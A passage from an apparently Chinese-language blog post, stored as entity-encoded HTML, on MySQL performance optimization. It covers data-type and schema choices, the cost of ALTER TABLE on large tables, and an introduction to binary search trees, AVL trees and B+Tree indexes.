&#x6839;&#x636E;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x8C03;&#x7528;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684; API &#x6765;&#x6267;&#x884C;&#x67E5;&#x8BE2;</li><li>&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x540C;&#x65F6;&#x7F13;&#x5B58;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;</li></ol><h4 id="&#x6027;&#x80FD;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;"><a href="#&#x6027;&#x80FD;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;" class="headerlink" title="&#x6027;&#x80FD;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;"></a>&#x6027;&#x80FD;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;</h4><p>&#x770B;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x4F1A;&#x671F;&#x5F85;&#x7ED9;&#x51FA;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x624B;&#x6BB5;&#xFF0C;&#x662F;&#x7684;&#xFF0C;&#x4E0B;&#x9762;&#x4F1A;&#x4ECE; 3 &#x4E2A;&#x4E0D;&#x540C;&#x65B9;&#x9762;&#x7ED9;&#x51FA;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;&#x3002;&#x4F46;&#x8BF7;&#x7B49;&#x7B49;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x53E5;&#x5FE0;&#x544A;&#x8981;&#x5148;&#x9001;&#x7ED9;&#x4F60;&#xFF1A;&#x4E0D;&#x8981;&#x542C;&#x4FE1;&#x4F60;&#x770B;&#x5230;&#x7684;&#x5173;&#x4E8E;&#x4F18;&#x5316;&#x7684; &#x201C;&#x7EDD;&#x5BF9;&#x771F;&#x7406;&#x201D;&#xFF0C;&#x5305;&#x62EC;&#x672C;&#x6587;&#x6240;&#x8BA8;&#x8BBA;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x5E94;&#x8BE5;&#x662F;&#x5728;&#x5B9E;&#x9645;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x4E0B;&#x901A;&#x8FC7;&#x6D4B;&#x8BD5;&#x6765;&#x9A8C;&#x8BC1;&#x4F60;&#x5173;&#x4E8E;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x4EE5;&#x53CA;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7684;&#x5047;&#x8BBE;&#x3002;</p><p><strong>Scheme &#x8BBE;&#x8BA1;&#x4E0E;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4F18;&#x5316;</strong></p><p>&#x9009;&#x62E9;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EA;&#x8981;&#x9075;&#x5FAA;&#x5C0F;&#x800C;&#x7B80;&#x5355;&#x7684;&#x539F;&#x5219;&#x5C31;&#x597D;&#xFF0C;&#x8D8A;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x901A;&#x5E38;&#x4F1A;&#x66F4;&#x5FEB;&#xFF0C;&#x5360;&#x7528;&#x66F4;&#x5C11;&#x7684;&#x78C1;&#x76D8;&#x3001;&#x5185;&#x5B58;&#xFF0C;&#x5904;&#x7406;&#x65F6;&#x9700;&#x8981;&#x7684; CPU &#x5468;&#x671F;&#x4E5F;&#x66F4;&#x5C11;&#x3002;&#x8D8A;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5728;&#x8BA1;&#x7B97;&#x65F6;&#x9700;&#x8981;&#x66F4;&#x5C11;&#x7684; CPU &#x5468;&#x671F;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x6574;&#x578B;&#x5C31;&#x6BD4;&#x5B57;&#x7B26;&#x64CD;&#x4F5C;&#x4EE3;&#x4EF7;&#x4F4E;&#xFF0C;&#x56E0;&#x800C;&#x4F1A;&#x4F7F;&#x7528;&#x6574;&#x578B;&#x6765;&#x5B58;&#x50A8; IP &#x5730;&#x5740;&#xFF0C;&#x4F7F;&#x7528;DATETIME&#x6765;&#x5B58;&#x50A8;&#x65F6;&#x95F4;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x603B;&#x7ED3;&#x51E0;&#x4E2A;&#x53EF;&#x80FD;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x9519;&#x8BEF;&#x7684;&#x6280;&#x5DE7;&#xFF1A;</p><ol><li>&#x901A;&#x5E38;&#x6765;&#x8BF4;&#x628A;&#x53EF;&#x4E3A;<code>NULL</code>&#x7684;&#x5217;&#x6539;&#x4E3A;<code>NOT NULL</code>&#x4E0D;&#x4F1A;&#x5BF9;&#x6027;&#x80FD;&#x63D0;&#x5347;&#x6709;&#x591A;&#x5C11;&#x5E2E;&#x52A9;&#xFF0C;&#x53EA;&#x662F;&#x5982;&#x679C;&#x8BA1;&#x5212;&#x5728;&#x5217;&#x4E0A;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x5C31;&#x5E94;&#x8BE5;&#x5C06;&#x8BE5;&#x5217;&#x8BBE;&#x7F6E;&#x4E3A;<code>NOT NULL</code>&#x3002;</li><li>&#x5BF9;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x6307;&#x5B9A;&#x5BBD;&#x5EA6;&#xFF0C;&#x6BD4;&#x5982;<code>INT(11)</code>&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5375;&#x7528;&#x3002;<code>INT</code>&#x4F7F;&#x7528; <code>32</code> &#x4F4D;&#xFF08;<code>4</code> &#x4E2A;&#x5B57;&#x8282;&#xFF09;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x7684;&#x8868;&#x793A;&#x8303;&#x56F4;&#x5DF2;&#x7ECF;&#x786E;&#x5B9A;&#xFF0C;&#x6240;&#x4EE5;<code>INT(1)</code>&#x548C;<code>INT(20)</code>&#x5BF9;&#x4E8E;&#x5B58;&#x50A8;&#x548C;&#x8BA1;&#x7B97;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002;</li><li><code>UNSIGNED</code>&#x8868;&#x793A;&#x4E0D;&#x5141;&#x8BB8;&#x8D1F;&#x503C;&#xFF0C;&#x5927;&#x81F4;&#x53EF;&#x4EE5;&#x4F7F;&#x6B63;&#x6570;&#x7684;&#x4E0A;&#x9650;&#x63D0;&#x9AD8;&#x4E00;&#x500D;&#x3002;&#x6BD4;&#x5982;<code>TINYINT</code>&#x5B58;&#x50A8;&#x8303;&#x56F4;&#x662F; <code>-128 ~ 127</code>&#xFF0C;&#x800C;<code>UNSIGNED TINYINT</code>&#x5B58;&#x50A8;&#x7684;&#x8303;&#x56F4;&#x5374;&#x662F; <code>0 - 255</code>&#x3002;</li><li>&#x901A;&#x5E38;&#x6765;&#x8BB2;&#xFF0C;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x7684;&#x5FC5;&#x8981;&#x4F7F;&#x7528;<code>DECIMAL</code>&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3002;&#x5373;&#x4F7F;&#x662F;&#x5728;&#x9700;&#x8981;&#x5B58;&#x50A8;&#x8D22;&#x52A1;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>BIGINT</code>&#x3002;&#x6BD4;&#x5982;&#x9700;&#x8981;&#x7CBE;&#x786E;&#x5230;&#x4E07;&#x5206;&#x4E4B;&#x4E00;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5C06;&#x6570;&#x636E;&#x4E58;&#x4EE5;&#x4E00;&#x767E;&#x4E07;&#x7136;&#x540E;&#x4F7F;&#x7528;<code>BIGINT</code>&#x5B58;&#x50A8;&#x3002;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x6D6E;&#x70B9;&#x6570;&#x8BA1;&#x7B97;&#x4E0D;&#x51C6;&#x786E;&#x548C;<code>DECIMAL</code>&#x7CBE;&#x786E;&#x8BA1;&#x7B97;&#x4EE3;&#x4EF7;&#x9AD8;&#x7684;&#x95EE;&#x9898;&#x3002;</li><li><code>TIMESTAMP</code>&#x4F7F;&#x7528; 4 &#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;<code>DATETIME</code>&#x4F7F;&#x7528; <code>8</code> &#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;&#x56E0;&#x800C;&#xFF0C;<code>TIMESTAMP</code>&#x53EA;&#x80FD;&#x8868;&#x793A; <code>1970 - 2038</code> &#x5E74;&#xFF0C;&#x6BD4;<code>DATETIME</code>&#x8868;&#x793A;&#x7684;&#x8303;&#x56F4;&#x5C0F;&#x5F97;&#x591A;&#xFF0C;&#x800C;&#x4E14;<code>TIMESTAMP</code>&#x7684;&#x503C;&#x56E0;&#x65F6;&#x533A;&#x4E0D;&#x540C;&#x800C;&#x4E0D;&#x540C;&#x3002;</li><li>&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x679A;&#x4E3E;&#x7C7B;&#x578B;&#x7684;&#x5FC5;&#x8981;&#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7F3A;&#x70B9;&#x662F;&#x679A;&#x4E3E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5217;&#x8868;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6DFB;&#x52A0;&#x548C;&#x5220;&#x9664;&#x5B57;&#x7B26;&#x4E32;&#xFF08;&#x679A;&#x4E3E;&#x9009;&#x9879;&#xFF09;&#x5FC5;&#x987B;&#x4F7F;&#x7528;<code>ALTER TABLE</code>&#xFF08;&#x5982;&#x679C;&#x53EA;&#x53EA;&#x662F;&#x5728;&#x5217;&#x8868;&#x672B;&#x5C3E;&#x8FFD;&#x52A0;&#x5143;&#x7D20;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x5EFA;&#x8868;&#xFF09;&#x3002;</li><li><code>schema</code> &#x7684;&#x5217;&#x4E0D;&#x8981;&#x592A;&#x591A;&#x3002;&#x539F;&#x56E0;&#x662F;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684; API &#x5DE5;&#x4F5C;&#x65F6;&#x9700;&#x8981;&#x5728;&#x670D;&#x52A1;&#x5668;&#x5C42;&#x548C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5C42;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x884C;&#x7F13;&#x51B2;&#x683C;&#x5F0F;&#x62F7;&#x8D1D;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x670D;&#x52A1;&#x5668;&#x5C42;&#x5C06;&#x7F13;&#x51B2;&#x5185;&#x5BB9;&#x89E3;&#x7801;&#x6210;&#x5404;&#x4E2A;&#x5217;&#xFF0C;&#x8FD9;&#x4E2A;&#x8F6C;&#x6362;&#x8FC7;&#x7A0B;&#x7684;&#x4EE3;&#x4EF7;&#x662F;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x3002;&#x5982;&#x679C;&#x5217;&#x592A;&#x591A;&#x800C;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x7684;&#x5217;&#x53C8;&#x5F88;&#x5C11;&#x7684;&#x8BDD;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4; <code>CPU</code> &#x5360;&#x7528;&#x8FC7;&#x9AD8;&#x3002;</li><li>&#x5927;&#x8868;<code>ALTER TABLE</code>&#x975E;&#x5E38;&#x8017;&#x65F6;&#xFF0C;MySQL &#x6267;&#x884C;&#x5927;&#x90E8;&#x5206;&#x4FEE;&#x6539;&#x8868;&#x7ED3;&#x679C;&#x64CD;&#x4F5C;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x7528;&#x65B0;&#x7684;&#x7ED3;&#x6784;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5F20;&#x7A7A;&#x8868;&#xFF0C;&#x4ECE;&#x65E7;&#x8868;&#x4E2D;&#x67E5;&#x51FA;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x63D2;&#x5165;&#x65B0;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5220;&#x9664;&#x65E7;&#x8868;&#x3002;&#x5C24;&#x5176;&#x5F53;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x800C;&#x8868;&#x53C8;&#x5F88;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x6709;&#x5F88;&#x5927;&#x7D22;&#x5F15;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8017;&#x65F6;&#x66F4;&#x4E45;&#x3002;&#x5F53;&#x7136;&#x6709;&#x4E00;&#x4E9B;&#x5947;&#x6280;&#x6DEB;&#x5DE7;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x53EF;&#x81EA;&#x884C;&#x67E5;&#x9605;&#x3002;</li></ol><p><strong>&#x521B;&#x5EFA;&#x9AD8;&#x6027;&#x80FD;&#x7D22;&#x5F15;</strong><br>&#x7D22;&#x5F15;&#x662F;&#x63D0;&#x9AD8; MySQL &#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x9014;&#x5F84;&#xFF0C;&#x4F46;&#x8FC7;&#x591A;&#x7684;&#x7D22;&#x5F15;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x8FC7;&#x9AD8;&#x7684;&#x78C1;&#x76D8;&#x4F7F;&#x7528;&#x7387;&#x4EE5;&#x53CA;&#x8FC7;&#x9AD8;&#x7684;&#x5185;&#x5B58;&#x5360;&#x7528;&#xFF0C;&#x4ECE;&#x800C;&#x5F71;&#x54CD;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x3002;&#x5E94;&#x5F53;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4E8B;&#x540E;&#x624D;&#x60F3;&#x8D77;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#xFF0C;&#x56E0;&#x4E3A;&#x4E8B;&#x540E;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x5927;&#x91CF;&#x7684; SQL &#x624D;&#x80FD;&#x5B9A;&#x4F4D;&#x5230;&#x95EE;&#x9898;&#x6240;&#x5728;&#xFF0C;&#x800C;&#x4E14;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x80AF;&#x5B9A;&#x662F;&#x8FDC;&#x5927;&#x4E8E;&#x521D;&#x59CB;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#x6240;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x53EF;&#x89C1;&#x7D22;&#x5F15;&#x7684;&#x6DFB;&#x52A0;&#x4E5F;&#x662F;&#x975E;&#x5E38;&#x6709;&#x6280;&#x672F;&#x542B;&#x91CF;&#x7684;&#x3002;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x5C06;&#x5411;&#x4F60;&#x5C55;&#x793A;&#x4E00;&#x7CFB;&#x5217;&#x521B;&#x5EFA;&#x9AD8;&#x6027;&#x80FD;&#x7D22;&#x5F15;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x4EE5;&#x53CA;&#x6BCF;&#x6761;&#x7B56;&#x7565;&#x5176;&#x80CC;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x3002;&#x4F46;&#x5728;&#x6B64;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x4E86;&#x89E3;&#x4E0E;&#x7D22;&#x5F15;&#x76F8;&#x5173;&#x7684;&#x4E00;&#x4E9B;&#x7B97;&#x6CD5;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x5C06;&#x6709;&#x52A9;&#x4E8E;&#x66F4;&#x597D;&#x7684;&#x7406;&#x89E3;&#x540E;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p><strong>&#x7D22;&#x5F15;&#x76F8;&#x5173;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x548C;&#x7B97;&#x6CD5;</strong></p><p>&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x6240;&#x8BF4;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x6307;<code>B-Tree</code>&#x7D22;&#x5F15;&#xFF0C;&#x5B83;&#x662F;&#x76EE;&#x524D;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x627E;&#x6570;&#x636E;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x548C;&#x6709;&#x6548;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x90FD;&#x652F;&#x6301;&#x8FD9;&#x79CD;&#x7D22;&#x5F15;&#x3002;&#x4F7F;&#x7528;<code>B-Tree</code>&#x8FD9;&#x4E2A;&#x672F;&#x8BED;&#xFF0C;&#x662F;&#x56E0;&#x4E3A; MySQL &#x5728;<code>CREATE TABLE</code>&#x6216;&#x5176;&#x5B83;&#x8BED;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x4E0D;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x6BD4;&#x5982; InnoDB &#x5C31;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x5B83;&#x7684;&#x53D8;&#x79CD;B+Tree&#x3002;</p><p><code>B+Tree</code>&#x4E2D;&#x7684; B &#x662F;&#x6307;<code>balance</code>&#xFF0C;&#x610F;&#x4E3A;&#x5E73;&#x8861;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;B + &#x6811;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x80FD;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x952E;&#x503C;&#x7684;&#x5177;&#x4F53;&#x884C;&#xFF0C;&#x5B83;&#x627E;&#x5230;&#x7684;&#x53EA;&#x662F;&#x88AB;&#x67E5;&#x627E;&#x6570;&#x636E;&#x884C;&#x6240;&#x5728;&#x7684;&#x9875;&#xFF0C;&#x63A5;&#x7740;&#x6570;&#x636E;&#x5E93;&#x4F1A;&#x628A;&#x9875;&#x8BFB;&#x5165;&#x5230;&#x5185;&#x5B58;&#xFF0C;&#x518D;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x8FDB;&#x884C;&#x67E5;&#x627E;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x8981;&#x67E5;&#x627E;&#x7684;&#x6570;&#x636E;&#x3002;</p><p>&#x5728;&#x4ECB;&#x7ECD;<code>B+Tree</code>&#x524D;&#xFF0C;&#x5148;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x7ECF;&#x5178;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x5176;&#x5DE6;&#x5B50;&#x6811;&#x7684;&#x503C;&#x603B;&#x662F;&#x5C0F;&#x4E8E;&#x6839;&#x7684;&#x503C;&#xFF0C;&#x53F3;&#x5B50;&#x6811;&#x7684;&#x503C;&#x603B;&#x662F;&#x5927;&#x4E8E;&#x6839;&#x7684;&#x503C;&#xFF0C;&#x5982;&#x4E0B;&#x56FE; &#x2460;&#x3002;&#x5982;&#x679C;&#x8981;&#x5728;&#x8FD9;&#x8BFE;&#x6811;&#x4E2D;&#x67E5;&#x627E;&#x503C;&#x4E3A; 5 &#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x5176;&#x5927;&#x81F4;&#x6D41;&#x7A0B;&#xFF1A;&#x5148;&#x627E;&#x5230;&#x6839;&#xFF0C;&#x5176;&#x503C;&#x4E3A; 6&#xFF0C;&#x5927;&#x4E8E; 5&#xFF0C;&#x6240;&#x4EE5;&#x67E5;&#x627E;&#x5DE6;&#x5B50;&#x6811;&#xFF0C;&#x627E;&#x5230; 3&#xFF0C;&#x800C; 5 &#x5927;&#x4E8E; 3&#xFF0C;&#x63A5;&#x7740;&#x627E; 3 &#x7684;&#x53F3;&#x5B50;&#x6811;&#xFF0C;&#x603B;&#x5171;&#x627E;&#x4E86; 3 &#x6B21;&#x3002;&#x540C;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x627E;&#x503C;&#x4E3A; 8 &#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x67E5;&#x627E; 3 &#x6B21;&#x3002;&#x6240;&#x4EE5;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x627E;&#x6B21;&#x6570;&#x4E3A; (3 + 3 + 3 + 2 + 2 + 1) / 6 = 2.3 &#x6B21;&#xFF0C;&#x800C;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x7684;&#x8BDD;&#xFF0C;&#x67E5;&#x627E;&#x503C;&#x4E3A; 2 &#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x4EC5;&#x9700;&#x8981; 1 &#x6B21;&#xFF0C;&#x4F46;&#x67E5;&#x627E;&#x503C;&#x4E3A; 8 &#x7684;&#x8BB0;&#x5F55;&#x5219;&#x9700;&#x8981; 6 &#x6B21;&#xFF0C;&#x6240;&#x4EE5;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x627E;&#x6B21;&#x6570;&#x4E3A;&#xFF1A;(1 + 2 + 3 + 4 + 5 + 6) / 6 = 3.3 &#x6B21;&#xFF0C;&#x56E0;&#x6B64;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x627E;&#x901F;&#x5EA6;&#x6BD4;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x8981;&#x5FEB;&#x3002;</p><p>&#x7531;&#x4E8E;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#x53EF;&#x4EE5;&#x4EFB;&#x610F;&#x6784;&#x9020;&#xFF0C;&#x540C;&#x6837;&#x7684;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x5982;&#x56FE; &#x2461; &#x7684;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#xFF0C;&#x663E;&#x7136;&#x8FD9;&#x68F5;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x548C;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x5DEE;&#x4E0D;&#x591A;&#x3002;&#x82E5;&#x60F3;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6570;&#x7684;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x6700;&#x9AD8;&#xFF0C;&#x9700;&#x8981;&#x8FD9;&#x68F5;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#x662F;&#x5E73;&#x8861;&#x7684;&#xFF0C;&#x4E5F;&#x5373;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#xFF08;AVL &#x6811;&#xFF09;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/shu.jpg" title="shu"></p><p>&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x9996;&#x5148;&#x9700;&#x8981;&#x7B26;&#x5408;&#x4E8C;&#x53C9;&#x67E5;&#x627E;&#x6811;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x6B21;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x4EFB;&#x4F55;&#x8282;&#x70B9;&#x7684;&#x4E24;&#x4E2A;&#x5B50;&#x6811;&#x7684;&#x9AD8;&#x5EA6;&#x5DEE;&#x4E0D;&#x80FD;&#x5927;&#x4E8E; 1&#x3002;&#x663E;&#x7136;&#x56FE; &#x2461; &#x4E0D;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x800C;&#x56FE; &#x2460; &#x662F;&#x4E00;&#x8BFE;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x3002;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x67E5;&#x627E;&#x6027;&#x80FD;&#x662F;&#x6BD4;&#x8F83;&#x9AD8;&#x7684;&#xFF08;&#x6027;&#x80FD;&#x6700;&#x597D;&#x7684;&#x662F;&#x6700;&#x4F18;&#x4E8C;&#x53C9;&#x6811;&#xFF09;&#xFF0C;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x8D8A;&#x597D;&#xFF0C;&#x7EF4;&#x62A4;&#x7684;&#x6210;&#x672C;&#x5C31;&#x8D8A;&#x5927;&#x3002;&#x6BD4;&#x5982;&#x56FE; &#x2460; &#x7684;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x9700;&#x8981;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x503C; 9 &#x7684;&#x8282;&#x70B9;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x505A;&#x51FA;&#x5982;&#x4E0B;&#x53D8;&#x52A8;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/ershu.jpg" title="ershu"></p><p>&#x901A;&#x8FC7;&#x4E00;&#x6B21;&#x5DE6;&#x65CB;&#x64CD;&#x4F5C;&#x5C31;&#x5C06;&#x63D2;&#x5165;&#x540E;&#x7684;&#x6811;&#x91CD;&#x65B0;&#x53D8;&#x4E3A;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x662F;&#x6700;&#x7B80;&#x5355;&#x7684;&#x60C5;&#x51B5;&#x4E86;&#xFF0C;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x573A;&#x666F;&#x4E2D;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x65CB;&#x8F6C;&#x591A;&#x6B21;&#x3002;&#x81F3;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x67E5;&#x627E;&#x6548;&#x7387;&#x8FD8;&#x4E0D;&#x9519;&#xFF0C;&#x5B9E;&#x73B0;&#x4E5F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x7EF4;&#x62A4;&#x6210;&#x672C;&#x8FD8;&#x80FD;&#x63A5;&#x53D7;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48; MySQL &#x7D22;&#x5F15;&#x4E0D;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#xFF1F;</p><p>&#x968F;&#x7740;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x7D22;&#x5F15;&#x672C;&#x8EAB;&#x5927;&#x5C0F;&#x968F;&#x4E4B;&#x589E;&#x52A0;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x5168;&#x90E8;&#x5B58;&#x50A8;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x56E0;&#x6B64;&#x7D22;&#x5F15;&#x5F80;&#x5F80;&#x4EE5;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x7684;&#x78C1;&#x76D8;&#x4E0A;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#xFF0C;&#x7D22;&#x5F15;&#x67E5;&#x627E;&#x8FC7;&#x7A0B;&#x4E2D;&#x5C31;&#x8981;&#x4EA7;&#x751F;&#x78C1;&#x76D8; I/O &#x6D88;&#x8017;&#xFF0C;&#x76F8;&#x5BF9;&#x4E8E;&#x5185;&#x5B58;&#x5B58;&#x53D6;&#xFF0C;I/O 